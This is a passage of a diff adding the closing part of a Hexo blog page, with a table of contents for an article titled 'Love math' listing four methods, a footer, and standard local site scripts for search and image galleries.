+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Love-math"><span class="toc-article-text">Love math</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-article-text">方法一</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-article-text">方法二</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-article-text">方法三</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B"><span class="toc-article-text">方法四</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
